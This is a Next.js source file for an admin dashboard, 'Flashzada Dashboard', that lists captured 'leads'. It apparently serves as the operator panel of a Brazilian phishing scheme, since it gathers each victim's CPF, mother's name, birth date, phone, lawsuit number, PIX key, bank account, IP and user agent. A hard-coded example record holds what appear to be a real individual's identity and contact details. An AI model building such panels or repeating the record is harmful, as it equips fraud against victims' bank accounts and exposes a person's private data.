"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { motion, AnimatePresence } from "framer-motion"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { createClient } from "@/lib/supabase/client"
import { LogoutButton } from "@/components/auth/logout-button"

interface Lead {
  id: string
  cpf: string
  nome: string
  data_nascimento: string
  nome_mae: string
  telefone?: string
  processo?: string
  empresa?: string
  status?: string
  tipo_chave_pix?: string
  chave_pix?: string
  banco?: string
  agencia?: string
  conta?: string
  ip?: string
  user_agent?: string
  data_criacao: string
  ultima_atualizacao: string
}

export default function AdminDashboard() {
  const [leads, setLeads] = useState<Lead[]>([])
  const [selectedLead, setSelectedLead] = useState<Lead | null>(null)
  const [user, setUser] = useState<any>(null)
  const [isLoading, setIsLoading] = useState(true)
  const router = useRouter()
  const supabase = createClient()

  useEffect(() => {
    const checkAuth = async () => {
      const {
        data: { user },
      } = await supabase.auth.getUser()

      if (!user) {
        router.push("/auth/login")
        return
      }

      setUser(user)
      setIsLoading(false)

      const storedLeads = localStorage.getItem("leads")
      if (storedLeads) {
        setLeads(JSON.parse(storedLeads))
      } else {
        const exampleLeads: Lead[] = [
          {
            id: "#0001",
            cpf: "841.468.694-04",
            nome: "JOSE CHRISTIAN DE LIMA NOVAIS",
            data_nascimento: "25/05/1973",
            nome_mae: "MARIA DE FATIMA DE LIMA NOVAIS",
            telefone: "(82) 98829-1668",
            processo: "5646662-74.2024.8.26.2025",
            empresa: "Banco Bradesco S.A.",
            status: "NOVO",
            tipo_chave_pix: "EMAIL",
            chave_pix: "pedronovaisengcp@gmail.com",
            banco: "2w1",
            agencia: "12112",
            conta: "3123",
            ip: "51.159.226.160",
            user_agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            data_criacao: "04/07/2025, 16:49:57",
            ultima_atualizacao: "04/07/2025, 16:49:57",
          },
        ]
        setLeads(exampleLeads)
        localStorage.setItem("leads", JSON.stringify(exampleLeads))
      }
    }

    checkAuth()

    const {
      data: { subscription },
    } = supabase.auth.onAuthStateChange((event, session) => {
      if (!session?.user) {
        router.push("/auth/login")
      } else {
        setUser(session.user)
      }
    })

    return () => subscription.unsubscribe()
  }, [router, supabase.auth])

  if (isLoading) {
    return (
      <div className="nft-admin min-h-screen nft-gradient-bg flex items-center justify-center">
        <div className="pixel-font text-2xl neon-text-green">Carregando...</div>
      </div>
    )
  }

  return (
    <div className="nft-admin min-h-screen nft-gradient-bg relative overflow-hidden">
      <div className="decorative-corner decorative-corner-tl"></div>
      <div className="decorative-corner decorative-corner-tr"></div>
      <div className="decorative-corner decorative-corner-bl"></div>
      <div className="decorative-corner decorative-corner-br"></div>

      {/* Header */}
      <header className="nft-card border-b border-primary/30 p-6 backdrop-blur-sm relative z-10">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          <h1 className="pixel-font text-4xl neon-text-green">Flashzada Dashboard</h1>
          <div className="flex items-center gap-4">
            <Badge className="nft-badge pixel-font text-lg px-4 py-2">{leads.length} Leads</Badge>
            <div className="flex items-center gap-2">
              <span className="pixel-font text-sm text-muted-foreground">{user?.email}</span>
              <LogoutButton />
            </div>
          </div>
        </div>
      </header>

      <div className="max-w-7xl mx-auto p-6 relative z-10">
        {/* Stats Cards */}
        <div className="grid grid-cols-1 md:grid-cols-4 gap-6 mb-8">
          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 }}>
            <Card className="nft-card nft-card-blue floating">
              <CardHeader className="pb-2">
                <CardTitle className="pixel-font text-sm neon-text-blue">Total Leads</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="pixel-font text-3xl font-bold neon-text-blue">{leads.length}</div>
              </CardContent>
            </Card>
          </motion.div>

          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.2 }}>
            <Card className="nft-card nft-card-orange floating">
              <CardHeader className="pb-2">
                <CardTitle className="pixel-font text-sm neon-text-orange">Novos Hoje</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="pixel-font text-3xl font-bold neon-text-orange">
                  {leads.filter((l) => l.status === "NOVO").length}
                </div>
              </CardContent>
            </Card>
          </motion.div>

          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.3 }}>
            <Card className="nft-card nft-card-purple floating">
              <CardHeader className="pb-2">
                <CardTitle className="pixel-font text-sm neon-text-purple">Com PIX</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="pixel-font text-3xl font-bold neon-text-purple">
                  {leads.filter((l) => l.chave_pix).length}
                </div>
              </CardContent>
            </Card>
          </motion.div>

          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.4 }}>
            <Card className="nft-card nft-card-green floating">
              <CardHeader className="pb-2">
                <CardTitle className="pixel-font text-sm neon-text-green">Processados</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="pixel-font text-3xl font-bold neon-text-green">
                  {leads.filter((l) => l.processo).length}
                </div>
              </CardContent>
            </Card>
          </motion.div>
        </div>

        {/* Leads Table */}
        <Card className="nft-card floating">
          <CardHeader>
            <CardTitle className="pixel-font text-2xl neon-text-green">Gerenciamento de Leads</CardTitle>
            <CardDescription className="pixel-font text-muted-foreground">
              Visualize e gerencie todos os leads capturados
            </CardDescription>
          </CardHeader>
          <CardContent>
            <div className="space-y-4">
              {leads.map((lead, index) => (
                <motion.div
                  key={lead.id}
                  initial={{ opacity: 0, x: -20 }}
                  animate={{ opacity: 1, x: 0 }}
                  transition={{ delay: index * 0.1 }}
                  className="nft-card-dark rounded-lg p-4 hover:bg-primary/10 transition-all duration-300 cursor-pointer border border-primary/20"
                  onClick={() => setSelectedLead(lead)}
                >
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-4">
                      <div className="w-12 h-12 bg-gradient-to-r from-primary to-secondary rounded-full flex items-center justify-center">
                        <svg
                          className="w-6 h-6 text-primary-foreground"
                          fill="none"
                          stroke="currentColor"
                          viewBox="0 0 24 24"
                        >
                          <path
                            strokeLinecap="round"
                            strokeLinejoin="round"
                            strokeWidth={2}
                            d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"
                          />
                        </svg>
                      </div>
                      <div>
                        <h3 className="pixel-font font-semibold text-foreground text-lg">{lead.nome}</h3>
                        <p className="pixel-font text-sm text-muted-foreground">CPF: {lead.cpf}</p>
                      </div>
                    </div>
                    <div className="flex items-center gap-2">
                      {lead.status && <Badge className="nft-badge pixel-font">{lead.status}</Badge>}
                      <span className="pixel-font text-sm text-muted-foreground">{lead.data_criacao}</span>
                    </div>
                  </div>
                </motion.div>
              ))}
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Modal de Detalhes do Lead */}
      <AnimatePresence>
        {selectedLead && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4 z-50"
            onClick={() => setSelectedLead(null)}
          >
            <motion.div
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className="nft-card-dark rounded-lg p-6 max-w-4xl w-full max-h-[90vh] overflow-y-auto border-2 border-primary/30"
              onClick={(e) => e.stopPropagation()}
            >
              <div className="flex items-center justify-between mb-6">
                <h2 className="pixel-font text-3xl font-bold neon-text-blue flex items-center gap-2">
                  <svg className="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"
                    />
                  </svg>
                  Detalhes do Lead
                </h2>
                <Button
                  onClick={() => setSelectedLead(null)}
                  className="nft-button-secondary pixel-font text-xl w-12 h-12"
                >
                  ✕
                </Button>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                {/* Dados Pessoais */}
                <Card className="nft-card nft-card-blue">
                  <CardHeader>
                    <CardTitle className="pixel-font text-xl neon-text-blue">Dados Pessoais</CardTitle>
                  </CardHeader>
                  <CardContent className="space-y-3 pixel-font">
                    <div>
                      <strong>ID:</strong> {selectedLead.id}
                    </div>
                    <div>
                      <strong>CPF:</strong> {selectedLead.cpf}
                    </div>
                    <div>
                      <strong>Nome:</strong> {selectedLead.nome}
                    </div>
                    <div>
                      <strong>Data Nascimento:</strong> {selectedLead.data_nascimento}
                    </div>
                    <div>
                      <strong>Nome da Mãe:</strong> {selectedLead.nome_mae}
                    </div>
                    {selectedLead.telefone && (
                      <div>
                        <strong>Telefone:</strong> {selectedLead.telefone}
                      </div>
                    )}
                  </CardContent>
                </Card>

                {/* Dados do Processo */}
                <Card className="nft-card nft-card-orange">
                  <CardHeader>
                    <CardTitle className="pixel-font text-xl neon-text-orange">Dados do Processo</CardTitle>
                  </CardHeader>
                  <CardContent className="space-y-3 pixel-font">
                    {selectedLead.processo && (
                      <div>
                        <strong>Processo:</strong> {selectedLead.processo}
                      </div>
                    )}
                    {selectedLead.empresa && (
                      <div>
                        <strong>Empresa:</strong> {selectedLead.empresa}
                      </div>
                    )}
                    {selectedLead.status && (
                      <div className="flex items-center gap-2">
                        <strong>Status:</strong>
                        <Badge className="nft-badge pixel-font">{selectedLead.status}</Badge>
                      </div>
                    )}
                  </CardContent>
                </Card>

                {/* Dados PIX */}
                <Card className="nft-card nft-card-green">
                  <CardHeader>
                    <CardTitle className="pixel-font text-xl neon-text-green">Dados PIX</CardTitle>
                  </CardHeader>
                  <CardContent className="space-y-3 pixel-font">
                    {selectedLead.tipo_chave_pix && (
                      <div className="flex items-center gap-2">
                        <strong>Tipo Chave:</strong>
                        <Badge className="nft-badge pixel-font">{selectedLead.tipo_chave_pix}</Badge>
                      </div>
                    )}
                    {selectedLead.chave_pix && (
                      <div>
                        <strong>Chave PIX:</strong> {selectedLead.chave_pix}
                      </div>
                    )}
                  </CardContent>
                </Card>

                {/* Dados Bancários */}
                <Card className="nft-card nft-card-purple">
                  <CardHeader>
                    <CardTitle className="pixel-font text-xl neon-text-purple">Dados Bancários</CardTitle>
                  </CardHeader>
                  <CardContent className="space-y-3 pixel-font">
                    {selectedLead.banco && (
                      <div>
                        <strong>Banco:</strong> {selectedLead.banco}
                      </div>
                    )}
                    {selectedLead.agencia && (
                      <div>
                        <strong>Agência:</strong> {selectedLead.agencia}
                      </div>
                    )}
                    {selectedLead.conta && (
                      <div>
                        <strong>Conta:</strong> {selectedLead.conta}
                      </div>
                    )}
                  </CardContent>
                </Card>
              </div>

              {/* Dados Técnicos */}
              <Card className="mt-6 nft-card nft-card-dark">
                <CardHeader>
                  <CardTitle className="pixel-font text-xl neon-text-red">Dados Técnicos</CardTitle>
                </CardHeader>
                <CardContent className="space-y-3 pixel-font">
                  {selectedLead.ip && (
                    <div>
                      <strong>IP:</strong> {selectedLead.ip}
                    </div>
                  )}
                  {selectedLead.user_agent && (
                    <div>
                      <strong>User Agent:</strong> <span className="text-sm font-mono">{selectedLead.user_agent}</span>
                    </div>
                  )}
                  <div>
                    <strong>Data Criação:</strong> {selectedLead.data_criacao}
                  </div>
                  <div>
                    <strong>Última Atualização:</strong> {selectedLead.ultima_atualizacao}
                  </div>
                </CardContent>
              </Card>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  )
}
